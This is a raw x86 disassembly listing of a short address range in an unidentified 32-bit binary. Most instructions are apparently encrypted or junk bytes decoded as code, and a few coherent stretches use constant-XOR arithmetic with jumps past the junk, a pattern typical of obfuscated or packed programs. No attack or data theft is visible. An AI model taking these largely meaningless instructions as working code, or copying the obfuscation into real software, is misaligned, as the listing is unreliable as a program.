  40c376:	add    cl,BYTE PTR [edx-0x5f7f0603]
  40c37c:	pop    esp
  40c37d:	cdq    
  40c37e:	mov    cl,0x9c
  40c380:	aad    0xff
  40c382:	sub    al,0x85
  40c384:	mov    esi,0xba2dd5b9
  40c389:	xchg   ecx,eax
  40c38a:	addr16 pushf 
  40c38c:	and    al,BYTE PTR [edi]
  40c38e:	mov    ds:0xb52dbfde,al
  40c393:	out    0x3c,al
  40c395:	adc    BYTE PTR [ecx+0x58],0x85
  40c399:	fiadd  DWORD PTR [ebp-0x31]
  40c39c:	jge    0x40c405
  40c39e:	dec    eax
  40c39f:	les    ebx,FWORD PTR [edx-0x13]
  40c3a2:	push   es
  40c3a3:	mov    BYTE PTR [edi+0x48],al
  40c3a6:	push   es
  40c3a7:	jl     0x40c3c9
  40c3a9:	mov    eax,ds:0xaaac168e
  40c3ae:	jns    0x40c3ff
  40c3b0:	or     al,0xdd
  40c3b2:	or     BYTE PTR [ecx-0xc],0x91
  40c3b6:	mov    bh,0xd
  40c3b8:	dec    eax
  40c3b9:	inc    ecx
  40c3ba:	aaa    
  40c3bb:	shl    BYTE PTR [eax],0x72
  40c3be:	mov    esi,edi
  40c3c0:	fsub   DWORD PTR [ecx-0x50135f6c]
  40c3c6:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3c8:	aam    0xbd
  40c3ca:	jmp    0x3fcf:0xa3c886cd
  40c3d1:	add    bh,BYTE PTR [ebx]
  40c3d3:	mov    dx,0x487c
  40c3d7:	out    dx,eax
  40c3d8:	jae    0x40c459
  40c3da:	push   cs
  40c3db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3dc:	or     al,0x21
  40c3de:	dec    ecx
  40c3df:	(bad)  
  40c3e0:	(bad)  
  40c3e1:	mov    dh,0x7e
  40c3e3:	jl     0x40c3a1
  40c3e5:	xor    ebp,DWORD PTR [ecx-0x75]
  40c3e8:	inc    ebp
  40c3e9:	cld    
  40c3ea:	mov    ecx,0x7510854
  40c3ef:	xor    eax,ecx
  40c3f1:	mov    edx,0x32729b
  40c3f6:	add    eax,edx
  40c3f8:	mov    DWORD PTR [ebp+0x8],eax
  40c3fb:	mov    eax,DWORD PTR [ebp-0x18]
  40c3fe:	xor    eax,ecx
  40c400:	add    eax,edx
  40c402:	mov    edx,DWORD PTR [ebp+0x14]
  40c405:	imul   eax,DWORD PTR [edx]
  40c408:	mov    edx,DWORD PTR [ebp-0x4]
  40c40b:	xor    edx,ecx
  40c40d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c410:	lea    ecx,[edx+ecx*1+0x32729b]
  40c417:	cmp    ecx,eax
  40c419:	je     0x40cbb9
  40c41f:	mov    edi,DWORD PTR [ebp-0x18]
  40c422:	mov    eax,DWORD PTR [ebp+0x8]
  40c425:	mov    edx,DWORD PTR [ebp+0x14]
  40c428:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40c42c:	mov    ecx,0x7510854
  40c431:	xor    edx,edx
  40c433:	xor    edi,ecx
  40c435:	jmp    0x40c698
  40c43a:	dec    ebp
  40c43b:	scas   al,BYTE PTR es:[edi]
  40c43c:	push   ss
  40c43d:	pop    ebx
  40c43e:	cmc    
  40c43f:	arpl   WORD PTR [ecx-0x58],si
  40c442:	pop    esi
  40c443:	clc    
  40c444:	push   ss
  40c445:	rcl    DWORD PTR [ecx+0x14a780e7],cl
  40c44b:	cmp    BYTE PTR [esi+0x7e],0x38
  40c44f:	jl     0x40c4cf
  40c451:	jle    0x40c416
  40c453:	xchg   esi,eax
  40c454:	mov    ebx,0x265ae238
  40c459:	aad    0xd5
  40c45b:	pusha  
  40c45c:	push   ss
  40c45d:	sbb    edi,ebp
  40c45f:	neg    BYTE PTR [ebx]
  40c461:	push   0xffffffbc
  40c463:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c464:	test   al,0xe1
  40c466:	jmp    0x40c43a
  40c468:	sbb    BYTE PTR [ebx],dh
  40c46a:	and    eax,0x22617866
  40c46f:	dec    esp
  40c470:	fcmovne st,st(5)
  40c472:	(bad)  
  40c473:	pushf  
  40c474:	arpl   WORD PTR [ebp+0x36a8ba6c],dx
  40c47a:	pusha  
  40c47b:	inc    eax
  40c47c:	jo     0x40c4dd
  40c47e:	int3   
  40c47f:	test   BYTE PTR [esi-0x67],al
  40c482:	stos   DWORD PTR es:[edi],eax
  40c483:	pop    es
  40c484:	lods   al,BYTE PTR ds:[esi]
  40c485:	and    eax,0x8ac77439
  40c48a:	sub    eax,DWORD PTR [ecx+esi*8]
  40c48d:	mov    eax,ds:0x70a2a4d3
  40c492:	xor    al,BYTE PTR [edi]
  40c494:	daa    
  40c495:	lock dec edx
  40c497:	push   esi
  40c498:	jo     0x40c41d
  40c49a:	scas   al,BYTE PTR es:[edi]
  40c49b:	popa   
  40c49c:	aam    0x6c
  40c49e:	push   edi
  40c49f:	cwde   
  40c4a0:	inc    esi
  40c4a1:	dec    ebx
  40c4a2:	call   0x8a8ab772
  40c4a7:	mov    ?,WORD PTR [edi-0x1d]
  40c4aa:	shl    DWORD PTR [ecx-0xa],cl
  40c4ad:	ss ror ebx,cl
  40c4b0:	enter  0x1bfd,0x76
  40c4b4:	inc    edx
  40c4b5:	hlt    
  40c4b6:	xchg   DWORD PTR [eax+eax*8+0x69],edi
  40c4ba:	shl    esi,0xbc
  40c4bd:	aaa    
  40c4be:	retf   
  40c4bf:	fsubr  QWORD PTR [ebx]
  40c4c1:	adc    al,dl
  40c4c3:	add    eax,0x178f7b7e
  40c4c8:	push   ss
  40c4c9:	mov    cs,eax
  40c4cb:	and    al,BYTE PTR [ebp+0x5f]
  40c4ce:	gs (bad) 
  40c4d0:	imul   edx,DWORD PTR [esi+0x70],0x45
  40c4d4:	jbe    0x40c54e
  40c4d6:	stos   DWORD PTR es:[edi],eax
  40c4d7:	stos   DWORD PTR es:[edi],eax
  40c4d8:	fist   DWORD PTR [ebx+0x1d]
  40c4db:	inc    ecx
  40c4dc:	clc    
  40c4dd:	adc    al,0xe2
  40c4df:	ror    BYTE PTR [ebx+0xb04f9ce],cl
  40c4e5:	repz push esp
  40c4e7:	mov    eax,edx
  40c4e9:	ret    0x853c
  40c4ec:	adc    al,0xf9
  40c4ee:	and    dl,BYTE PTR [edx-0x156188d6]
  40c4f4:	mov    ds:0xa1b7bd8a,al
  40c4f9:	in     al,dx
  40c4fa:	inc    edx
  40c4fb:	xchg   esp,eax
  40c4fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4fd:	xor    al,0xa5
  40c4ff:	lds    esp,FWORD PTR [eax+0x49]
  40c502:	push   esi
  40c503:	and    BYTE PTR [edx+ebx*4],0xc5
  40c507:	push   0xffffffce
  40c509:	sub    ecx,DWORD PTR [eax]
  40c50b:	retf   
  40c50c:	sub    ebx,DWORD PTR [ecx]
  40c50e:	add    al,0x5d
  40c510:	clc    
  40c511:	xor    esi,esp
  40c513:	cwde   
  40c514:	jno    0x40c4d2
  40c516:	outs   dx,BYTE PTR ds:[esi]
  40c517:	sbb    BYTE PTR [esi+ebx*4+0x18],dl
  40c51b:	jno    0x40c51c
  40c51d:	add    eax,0xccd94bbd
  40c522:	sti    
  40c523:	or     edx,DWORD PTR [eax-0x3b5096d3]
  40c529:	mov    DWORD PTR [ebx],ebp
  40c52b:	jp     0x40c58f
  40c52d:	add    DWORD PTR [esi-0x275f1011],0xffffffff
  40c534:	mov    BYTE PTR [esi+eax*1],bl
  40c537:	shl    DWORD PTR [edx+0x43],cl
  40c53a:	imul   esi,DWORD PTR [ebx],0x27658434
  40c540:	sti    
  40c541:	sahf   
  40c542:	das    
  40c543:	jp     0x40c4de
  40c545:	(bad)  
  40c546:	pop    eax
  40c547:	stos   BYTE PTR es:[edi],al
  40c548:	dec    ebx
  40c549:	jae    0x40c54a
  40c54b:	lock arpl WORD PTR [eax-0xf94b98f],dx
  40c552:	ret    0x8a7c
  40c555:	std    
  40c556:	jns    0x40c50d
  40c558:	sar    BYTE PTR [edi-0x4e3eaa2b],0x99
  40c55f:	dec    edx
  40c560:	aas    
  40c561:	push   0x2
  40c563:	test   edi,ebp
  40c565:	daa    
  40c566:	xchg   BYTE PTR [eax-0x50],bh
  40c569:	cli    
  40c56a:	pop    ecx
  40c56b:	jp     0x616f6859
  40c571:	adc    cl,ah
  40c573:	mov    esp,0x740cf578
  40c578:	dec    esi
  40c579:	pop    ebp
  40c57a:	sub    DWORD PTR [eax-0x5e],edi
  40c57d:	mov    ecx,0x367d6a3a
  40c582:	out    dx,eax
  40c583:	ins    BYTE PTR es:[edi],dx
  40c584:	mov    dl,0x8f
  40c586:	sbb    BYTE PTR [eax],dl
  40c588:	lock sbb BYTE PTR [esi+0x1e99b4eb],ch
  40c58f:	pop    esp
  40c590:	ret    0x95b9
  40c593:	push   ebx
  40c594:	xlat   BYTE PTR ds:[ebx]
  40c595:	mov    al,0xa5
  40c597:	out    dx,eax
  40c598:	cwde   
  40c599:	xor    DWORD PTR [edi+0x1962c49a],ebx
  40c59f:	ins    DWORD PTR es:[edi],dx
  40c5a0:	sbb    edi,DWORD PTR [ebx+0x58f95b19]
  40c5a6:	call   0xb1d129f2
  40c5ab:	add    ecx,ecx
  40c5ad:	aaa    
  40c5ae:	jle    0x40c53c
  40c5b0:	sub    eax,0x743434ed
  40c5b5:	cs fcom st(6)
  40c5b8:	ins    DWORD PTR es:[edi],dx
  40c5b9:	xlat   BYTE PTR ds:[ebx]
  40c5ba:	pop    ebp
  40c5bb:	(bad)  
  40c5bc:	(bad)  
  40c5bd:	mov    cl,0x24
  40c5bf:	sub    eax,edx
  40c5c1:	cs repz scas al,BYTE PTR es:[edi]
  40c5c4:	outs   dx,DWORD PTR ds:[esi]
  40c5c5:	pop    eax
  40c5c6:	push   ss
  40c5c7:	neg    BYTE PTR [ebx-0x77]
  40c5ca:	ror    bl,1
  40c5cc:	adc    eax,DWORD PTR [ebp+0x4e08311e]
  40c5d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5d3:	mov    edx,0xb880ad21
  40c5d8:	(bad)  [edi+0x6195dbe]
  40c5de:	mov    WORD PTR [ecx-0xdff9b16],gs
  40c5e4:	loop   0x40c5bf
  40c5e6:	popf   
  40c5e7:	pop    esp
  40c5e8:	inc    edi
  40c5e9:	push   ecx
  40c5ea:	or     BYTE PTR [edi-0x925e3fb],dh
  40c5f0:	sub    ah,bh
  40c5f2:	adc    eax,0x500045b2
  40c5f7:	pop    ds
  40c5f8:	ins    BYTE PTR es:[edi],dx
  40c5f9:	ret    
  40c5fa:	(bad)  
  40c5fb:	push   ebx
  40c5fd:	retf   
  40c5fe:	and    al,0x3a
  40c600:	dec    ebp
  40c601:	sub    eax,0xd9b9b64
  40c606:	(bad)  [ecx+0x6d8c82a]
  40c60c:	inc    ecx
  40c60d:	sub    BYTE PTR [eax],0xf3
  40c610:	push   ebx
  40c611:	push   ds
  40c612:	les    edx,FWORD PTR [esi+0x45]
  40c615:	and    al,0xae
  40c617:	dec    edi
  40c618:	mov    edi,0xba8f241c
  40c61d:	mov    ecx,0xaa7ea60a
  40c622:	xchg   edx,eax
  40c623:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c624:	mov    ecx,0x56229a91
  40c629:	aad    0xc8
  40c62b:	cmc    
  40c62c:	xchg   esi,eax
  40c62d:	xchg   esp,eax
  40c62e:	test   al,0xeb
  40c630:	aas    
  40c631:	inc    ecx
  40c632:	mov    dl,bh
  40c634:	jo     0x40c632
  40c636:	addr16 pop esi
  40c638:	fwait
  40c639:	adc    cl,BYTE PTR [ecx]
  40c63b:	dec    ebp
  40c63c:	pop    ecx
  40c63d:	dec    ebp
  40c63e:	icebp  
  40c63f:	add    esp,ebx
  40c641:	pusha  
  40c642:	stc    
  40c643:	pop    esi
  40c644:	jg     0x40c5f0
  40c646:	jo     0x40c5f9
  40c648:	mov    ch,BYTE PTR [ebp-0x10]
  40c64b:	lock add dh,BYTE PTR [eax+0x44]
  40c64f:	(bad)  
  40c650:	out    0x4a,eax
  40c652:	jge    0x40c5f0
  40c654:	clc    
  40c655:	je     0x40c5e1
  40c657:	lock xchg edi,eax
  40c659:	push   ebp
  40c65a:	inc    edi
  40c65b:	jns    0x40c5e9
  40c65d:	icebp  
  40c65e:	sub    ch,BYTE PTR [ecx]
  40c660:	jnp    0x40c5f6
  40c662:	xor    dl,BYTE PTR [ebx-0x555ca95f]
  40c668:	push   0x79
  40c66a:	push   es
  40c66b:	fdiv   DWORD PTR [eax]
  40c66d:	push   0xffffffd3
  40c66f:	scas   al,BYTE PTR es:[edi]
  40c670:	stc    
  40c671:	loope  0x40c698
  40c673:	pop    ds
  40c674:	dec    esp
  40c675:	cld    
  40c676:	in     eax,0xf7
  40c678:	jae    0x40c65b
  40c67a:	imul   edx,DWORD PTR [eax],0xfa0ba4ba
  40c680:	inc    DWORD PTR [edx-0x26]
  40c683:	mov    ebp,0x10a525d4
  40c688:	(bad)  
  40c689:	jae    0x40c689
  40c68b:	push   cs
  40c68c:	push   edi
  40c68d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c68e:	hlt    
  40c68f:	pop    ebp
  40c690:	xchg   edx,eax
  40c691:	jne    0x40c6cb
  40c693:	sbb    al,0x7d
  40c695:	popf   
  40c696:	jne    0x40c6b4
  40c698:	mov    esi,0x32729b
  40c69d:	add    edi,esi
  40c69f:	div    edi
  40c6a1:	mov    edx,DWORD PTR [ebp-0x4]
  40c6a4:	xor    edx,ecx
  40c6a6:	lea    eax,[edx+eax*1+0x32729b]
  40c6ad:	mov    edx,DWORD PTR [ebp+0x8]
  40c6b0:	mov    edi,DWORD PTR [ebp-0x24]
  40c6b3:	mov    DWORD PTR [edi+edx*4],eax
  40c6b6:	mov    eax,DWORD PTR [ebp-0x18]
  40c6b9:	mov    edx,DWORD PTR [ebp+0x8]
  40c6bc:	xor    eax,ecx
  40c6be:	lea    eax,[eax+edx*1+0x32729b]
  40c6c5:	mov    DWORD PTR [ebp+0x8],eax
  40c6c8:	mov    eax,DWORD PTR [ebp-0x18]
  40c6cb:	jmp    0x40c92e
  40c6d0:	leave  
  40c6d1:	adc    bl,ah
  40c6d3:	cmp    eax,0x10f1ede3
  40c6d8:	xor    BYTE PTR [ebp+0x2f5d9ac1],dl
  40c6de:	jno    0x40c689
  40c6e0:	fiadd  WORD PTR [eax+0x7c387e7e]
  40c6e6:	jle    0x40c766
  40c6e8:	(bad)  [edx]
  40c6ea:	out    0xbd,al
  40c6ec:	ror    BYTE PTR [esi+0x2c],1
  40c6ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6f0:	mov    dh,0x77
  40c6f2:	test   al,0xac
  40c6f4:	cmp    ch,dh
  40c6f6:	inc    edx
  40c6f7:	xchg   ecx,eax
  40c6f8:	dec    ebp
  40c6f9:	add    DWORD PTR ds:0xb83b7077,eax
  40c6ff:	lds    edi,FWORD PTR [ecx-0x425203c2]
  40c705:	int3   
  40c706:	in     eax,dx
  40c707:	push   0xffffffba
  40c709:	jnp    0x40c712
  40c70b:	push   ebx
  40c70c:	mov    cl,BYTE PTR [esp+ebx*4+0x3bed98f]
  40c713:	sub    al,0xad
  40c715:	mov    bl,0x86
  40c717:	mov    ds:0xd335acb,eax
  40c71c:	jmp    0xfeca69f
  40c721:	scas   al,BYTE PTR es:[edi]
  40c722:	call   0xb3f233d3
  40c727:	xor    eax,0x5c2eae9f
  40c72c:	fcom   st(1)
  40c72e:	sar    ecx,cl
  40c730:	push   ebp
  40c731:	jae    0x40c6ca
  40c733:	shl    DWORD PTR [eax+0x49],0x83
  40c737:	in     eax,dx
  40c738:	xchg   edx,eax
  40c739:	cmp    al,0x77
  40c73b:	neg    DWORD PTR [ebx]
  40c73d:	push   edx
  40c73e:	or     eax,0x639f7786
  40c743:	ret    
  40c744:	mov    ecx,0xbf7c05f1
  40c749:	sahf   
  40c74a:	inc    esp
  40c74b:	mov    ecx,0xd39ef495
  40c750:	xchg   ebp,eax
  40c751:	adc    eax,0xafb9fd7d
  40c756:	mov    DWORD PTR ds:0x52a7280,esi
  40c75c:	mov    DWORD PTR [eax],edi
  40c75e:	loopne 0x40c7bb
  40c760:	xor    eax,0x1a5757fe
  40c765:	loope  0x40c741
  40c767:	mov    ch,0xab
  40c769:	sub    al,0x10
  40c76b:	bound  ebx,QWORD PTR [edx-0x145f47a4]
  40c771:	inc    esi
  40c772:	jg     0x40c7a4
  40c774:	jmp    0x4627:0x1b14d095
  40c77b:	mov    edi,0x6988352f
  40c780:	mov    al,ds:0x9b3fbd3
  40c785:	ss jmp 0x40c7ba
  40c788:	sub    al,BYTE PTR [eax-0x4664bbfc]
  40c78e:	xor    BYTE PTR [edi+0x66c1bf8e],ch
  40c794:	add    DWORD PTR [ebx],ebp
  40c796:	and    DWORD PTR [ebx+0x701d7bb8],ecx
  40c79c:	push   esi
  40c79d:	mov    dl,0xfc
  40c79f:	push   ebx
  40c7a0:	or     ebp,DWORD PTR [ecx+esi*8+0x7e]
  40c7a4:	add    al,0x86
  40c7a6:	test   BYTE PTR ds:0x9f4fc190,0x47
  40c7ad:	sub    eax,0xeb00b2de
  40c7b2:	xchg   ebp,eax
  40c7b3:	lods   al,BYTE PTR ds:[esi]
  40c7b4:	test   eax,0x1ffd7a62
  40c7b9:	aad    0xce
  40c7bb:	fst    QWORD PTR [eax+0x1]
  40c7be:	scas   al,BYTE PTR es:[edi]
  40c7bf:	je     0x40c78a
  40c7c1:	sti    
  40c7c2:	adc    DWORD PTR [ecx],esp
  40c7c4:	loop   0x40c7be
  40c7c6:	mov    dh,0x54
  40c7c8:	pop    ds
  40c7c9:	jmp    0xacc7:0x2141b167
  40c7d0:	je     0x40c83f
  40c7d2:	dec    esi
  40c7d4:	add    al,0x39
  40c7d6:	add    eax,0xedccc688
  40c7db:	popa   
  40c7dc:	push   edx
  40c7dd:	arpl   WORD PTR [eax+ecx*2+0x621beb],ax
  40c7e4:	imul   edx,DWORD PTR [ecx+0x2f29fc7c],0x2a
  40c7eb:	xchg   edi,eax
  40c7ec:	push   0xb5d169f4
  40c7f1:	add    DWORD PTR [edi],ebp
  40c7f3:	in     eax,dx
  40c7f4:	xchg   ecx,eax
  40c7f5:	data16 loopne 0x40c843
  40c7f8:	scas   al,BYTE PTR es:[edi]
  40c7f9:	dec    ebx
  40c7fa:	lods   al,BYTE PTR ds:[esi]
  40c7fb:	or     eax,0xdc12b96a
  40c800:	ins    DWORD PTR es:[edi],dx
  40c801:	mov    esp,0x88372e32
  40c806:	sub    ecx,esp
  40c808:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c809:	xchg   BYTE PTR [edx+0x28],ch
  40c80c:	or     eax,DWORD PTR [esi-0x28356ddf]
  40c812:	arpl   WORD PTR [ebp+0x61baeb4b],bp
  40c818:	and    BYTE PTR [edx+0x6ed551eb],0x1c
  40c81f:	test   eax,0x6ffc3aa1
  40c824:	cvtdq2ps xmm1,xmm1
  40c827:	rcr    BYTE PTR [ecx-0x6a],1
  40c82a:	out    0xa,al
  40c82c:	add    dh,bh
  40c82e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c82f:	sub    al,0x17
  40c831:	pop    ecx
  40c832:	ret    
  40c833:	hlt    
  40c834:	sahf   
  40c835:	enter  0xc84a,0x41
  40c839:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c83a:	lahf   
  40c83b:	inc    esp
  40c83c:	lock iret 
  40c83e:	js     0x40c8ab
  40c840:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c841:	enter  0x22b6,0x9d
  40c845:	push   0x3c
  40c847:	loopne 0x40c830
  40c849:	ret    
  40c84a:	xlat   BYTE PTR ds:[ebx]
  40c84b:	jmp    0x4ec5:0xb0473388
  40c852:	ins    DWORD PTR es:[edi],dx
  40c853:	jg     0x40c863
  40c855:	hlt    
  40c856:	mov    bh,0xcd
  40c858:	sbb    DWORD PTR [esi-0x37],edx
  40c85b:	scas   al,BYTE PTR es:[edi]
  40c85c:	pop    ecx
  40c85d:	sahf   
  40c85e:	and    al,BYTE PTR [esi-0x28]
  40c861:	popa   
  40c862:	jl     0x40c898
  40c864:	push   ecx
  40c865:	sub    DWORD PTR [edi-0x24],edi
  40c868:	sbb    al,0x6c
  40c86a:	or     dl,BYTE PTR [ebp-0x19b4e40]
  40c870:	inc    ebx
  40c871:	cmc    
  40c872:	or     DWORD PTR [ecx],esp
  40c874:	lock and esp,DWORD PTR [edi+0x7f]
  40c878:	arpl   WORD PTR [esi-0x1c236f4e],bx
  40c87e:	adc    eax,0x6c2eda93
  40c883:	out    dx,eax
  40c884:	sahf   
  40c885:	in     al,dx
  40c886:	rcr    edx,1
  40c888:	cpuid  
  40c88a:	inc    edi
  40c88b:	nop
  40c88c:	mov    WORD PTR [ebx],?
  40c88e:	test   BYTE PTR [esi+0x12],cl
  40c891:	mov    al,0xc6
  40c893:	not    DWORD PTR [eax]
  40c895:	jmp    0xa0ff7704
  40c89a:	xchg   BYTE PTR [eax-0x350d453b],cl
  40c8a0:	stos   BYTE PTR es:[edi],al
  40c8a1:	bts    DWORD PTR [eax+ebx*4-0x37],ecx
  40c8a6:	aas    
  40c8a7:	push   ebx
  40c8a8:	daa    
  40c8a9:	shl    BYTE PTR [ecx],0xb
  40c8ac:	iret   
  40c8ad:	frstpm(287 only) 
  40c8af:	push   edx
  40c8b0:	xchg   edi,eax
  40c8b1:	int3   
  40c8b2:	or     BYTE PTR [ebp+ebx*1+0x3b],al
  40c8b6:	mov    esp,esi
  40c8b8:	pusha  
  40c8b9:	scas   al,BYTE PTR es:[edi]
  40c8ba:	cmp    dh,BYTE PTR [edi*8-0x4e0d526b]
  40c8c1:	cmp    al,0xd8
  40c8c3:	sbb    eax,0xf998bd62
  40c8c8:	in     eax,dx
  40c8c9:	sbb    al,0x22
  40c8cb:	cmp    BYTE PTR [eax+0x72],al
  40c8ce:	inc    ebp
  40c8cf:	outs   dx,BYTE PTR ds:[esi]
  40c8d0:	sub    esi,DWORD PTR [esi+0x5e313187]
  40c8d6:	cli    
  40c8d7:	retf   
  40c8d8:	(bad)  
  40c8d9:	ficomp DWORD PTR [edx+0x3006d36f]
  40c8df:	stc    
  40c8e0:	add    ch,bh
  40c8e2:	pop    ecx
  40c8e3:	mov    ds:0xc96d75a3,eax
  40c8e8:	push   ebp
  40c8e9:	scas   al,BYTE PTR es:[edi]
  40c8ea:	pop    edx
  40c8eb:	das    
  40c8ec:	lahf   
  40c8ed:	cwde   
  40c8ee:	std    
  40c8ef:	sbb    DWORD PTR [edx+eax*2],0xbc72b2d1
  40c8f6:	push   esi
  40c8f7:	and    ebx,DWORD PTR [esi]
  40c8f9:	imul   edi,DWORD PTR [edx],0xc46658cb
  40c8ff:	test   BYTE PTR [ecx+0x44fc4fa7],ch
  40c905:	add    eax,0xfc9e019e
  40c90a:	adc    bl,al
  40c90c:	jnp    0x40c952
  40c90e:	mov    gs,WORD PTR [ecx+0x53e340e3]
  40c914:	sar    ah,1
  40c916:	pushf  
  40c917:	dec    edx
  40c918:	shr    cl,0xe0
  40c91b:	cmp    bh,bh
  40c91d:	int    0xb7
  40c91f:	cli    
  40c920:	mov    ds:0xfff98d41,al
  40c925:	adc    DWORD PTR [di-0xd87],esp
  40c92a:	aam    0xa0
  40c92c:	shr    BYTE PTR [esi-0x75],0x55
  40c930:	adc    al,0x33
  40c932:	shr    ecx,0x5e
  40c935:	add    al,BYTE PTR [eax]
  40c937:	add    BYTE PTR [edi],al
  40c939:	mov    ah,0x6
  40c93b:	cwde   
  40c93c:	mov    ch,0xa8
  40c93e:	mov    eax,ds:0x31ca67b1
  40c943:	cmp    DWORD PTR [edi-0x67b19a14],esp
  40c949:	mov    ?,WORD PTR [esi+0x7e]
  40c94c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c950:	jb     0x40c9a1
  40c952:	daa    
  40c953:	les    esp,FWORD PTR [eax-0x25]
  40c956:	jmp    0x6830:0xe6abe392
  40c95d:	push   ebx
  40c95e:	iret   
  40c95f:	or     ch,BYTE PTR [ecx-0x4b]
  40c962:	xor    eax,0xa3ffedd1
  40c967:	pusha  
  40c968:	es call 0xa1bc:0x8f2293af
  40c970:	xchg   ebx,eax
  40c971:	adc    eax,DWORD PTR [eax+0x28c05304]
  40c977:	cwde   
  40c978:	inc    esi
  40c979:	hlt    
  40c97a:	daa    
  40c97b:	add    BYTE PTR [edx+0x2f],ch
  40c97e:	mov    edi,0x348ede76
  40c983:	sbb    al,0x8d
  40c985:	add    cl,BYTE PTR [ebx-0x4380a6ea]
  40c98b:	lahf   
  40c98c:	xor    ebp,ebx
  40c98e:	fxch   st(3)
  40c990:	inc    eax
  40c991:	fldln2 
  40c993:	data16 and bh,BYTE PTR [ecx]
  40c996:	xchg   BYTE PTR [ecx-0x2b],ah
  40c999:	stos   BYTE PTR es:[edi],al
  40c99a:	dec    ebx
  40c99b:	les    ebx,FWORD PTR [ecx-0x6236da1c]
  40c9a1:	mov    ds:0x2c05ffd9,al
  40c9a6:	lods   al,BYTE PTR ds:[esi]
  40c9a7:	mov    bh,0x1b
  40c9a9:	jge    0x40c9a6
  40c9ab:	mov    al,ds:0x7c2eb81c
  40c9b0:	retf   0x910d
  40c9b3:	sahf   
  40c9b4:	xor    BYTE PTR [edi],ah
  40c9b6:	iret   
  40c9b7:	xor    DWORD PTR [esi+ebp*1+0x6bb0d4],ecx
  40c9be:	add    BYTE PTR [ebx],dh
  40c9c0:	or     dl,BYTE PTR [ecx]
  40c9c2:	sbb    eax,0x9c4d450b
  40c9c7:	pop    ss
  40c9c8:	loope  0x40c993
  40c9ca:	stc    
  40c9cb:	xor    ebx,edi
  40c9cd:	adc    BYTE PTR [esi],0xd2
  40c9d0:	pusha  
  40c9d1:	popa   
  40c9d2:	rol    BYTE PTR [ecx+edi*4+0x31eb4e0a],cl
  40c9d9:	mov    fs,WORD PTR [eax+0x4e]
  40c9dc:	jecxz  0x40c9f6
  40c9de:	and    DWORD PTR [ebp+0x1a],esp
  40c9e1:	mov    WORD PTR [ebp+esi*8-0x430f2380],es
  40c9e8:	sbb    eax,DWORD PTR [ecx-0x3e99bedf]
  40c9ee:	dec    esp
  40c9ef:	xor    BYTE PTR [edx],al
  40c9f1:	in     al,dx
  40c9f2:	add    ah,al
  40c9f4:	inc    ebp
  40c9f5:	mov    DWORD PTR [ebp-0x6ba5a4e4],ebx
  40c9fb:	dec    eax
  40c9fc:	jp     0x40ca7c
  40c9fe:	dec    esi
  40c9ff:	lahf   
  40ca00:	and    DWORD PTR [esi],esi
  40ca02:	rol    DWORD PTR es:[edx+0x51],cl
  40ca06:	fbstp  TBYTE PTR [ebx+0xb]
  40ca0a:	xchg   BYTE PTR ds:0xda95765e,al
  40ca10:	loopne 0x40c9cf
  40ca12:	mov    ds:0xd462ee69,eax
  40ca17:	in     al,dx
  40ca18:	push   ecx
  40ca19:	js     0x40ca96
  40ca1b:	sbb    dh,BYTE PTR [esi+0x754a4a4b]
  40ca21:	outs   dx,DWORD PTR ds:[esi]
  40ca22:	add    al,0x5c
  40ca24:	inc    esp
  40ca25:	push   esi
  40ca26:	pushf  
  40ca27:	mov    eax,0x316f993
  40ca2c:	dec    esp
  40ca2d:	cmc    
  40ca2e:	outs   dx,DWORD PTR ds:[esi]
  40ca2f:	out    dx,al
  40ca30:	jl     0x40c9ec
  40ca32:	mov    eax,ds:0xac47ec1e
  40ca37:	mov    dl,0x48
  40ca39:	add    ch,BYTE PTR [ebx+ebp*1+0x32]
  40ca3d:	xlat   BYTE PTR es:[ebx]
  40ca3f:	mov    cl,0xb
  40ca41:	jne    0x40ca03
  40ca43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca44:	adc    al,0x78
  40ca46:	fnstcw WORD PTR [edx-0x520f72c5]
  40ca4c:	ins    BYTE PTR es:[edi],dx
  40ca4d:	test   BYTE PTR [ebx-0x26e205d4],0x1d
  40ca54:	jns    0x40ca35
  40ca56:	mov    ebx,0xa8f52688
  40ca5b:	dec    ebx
  40ca5c:	(bad)  
  40ca5d:	push   ecx
  40ca5e:	pushf  
  40ca5f:	outs   dx,DWORD PTR ds:[esi]
  40ca60:	iret   
  40ca61:	jbe    0x40caac
  40ca63:	jns    0x40cab8
  40ca65:	stc    
  40ca66:	sub    BYTE PTR [ebp+ecx*4-0x2b052606],bh
  40ca6d:	push   edx
  40ca6e:	mov    esp,0x30f34a73
  40ca73:	ds sahf 
  40ca75:	aas    
  40ca76:	cmp    dl,BYTE PTR [esi]
  40ca78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca79:	call   0xce30:0x3f6d5fab
  40ca80:	cmp    bh,al
  40ca82:	push   edx
  40ca83:	push   ds
  40ca84:	mov    edx,0x3dac36b3
  40ca89:	sub    bh,BYTE PTR [ecx]
  40ca8b:	mov    eax,ds:0xc6577c7e
  40ca90:	cs int3 
  40ca92:	mov    ah,0xa5
  40ca94:	push   ds
  40ca95:	xchg   DWORD PTR [ebp+0x56],esi
  40ca98:	loope  0x40caec
  40ca9a:	stc    
  40ca9b:	jp     0x40ca8c
  40ca9d:	push   ds
  40ca9e:	xor    ah,BYTE PTR [ecx+esi*4-0x5a]
  40caa2:	gs mov edx,0xcbcafc1c
  40caa8:	data16 loop 0x40cad5
  40caab:	(bad)
  40caae:	inc    edi
  40caaf:	push   edi
  40cab0:	push   ecx
  40cab1:	jg     0x40caaf
  40cab3:	add    BYTE PTR [edx-0x4081d991],dl
  40cab9:	mov    ss,WORD PTR [ebx]
  40cabb:	bswap  esi
